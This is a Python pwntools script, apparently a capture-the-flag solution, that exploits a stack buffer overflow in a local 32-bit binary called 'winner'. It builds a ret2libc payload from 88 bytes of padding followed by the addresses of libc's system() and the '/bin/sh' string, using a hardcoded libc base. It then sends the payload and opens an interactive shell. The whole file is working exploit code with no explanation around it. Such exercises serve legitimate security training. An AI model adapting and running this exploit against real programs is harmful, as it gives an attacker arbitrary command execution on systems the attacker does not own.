from pwn import *

elf = ELF("./winner", checksec=False)
libc = ELF("/lib32/libc.so.6", checksec=False)
context.binary = elf

offset = 88

sh_offset = next(libc.search(b"/bin/sh"))
system_offset = libc.symbols["system"]

libc_base = 0xf7c00000

payload = b""
payload += p32(libc_base + system_offset)
payload += b"BEEF"
payload += p32(libc_base + sh_offset)

exploit = b"A" * offset + payload

process = process(["./winner"])

process.sendline(exploit)
process.recvline()

process.interactive()

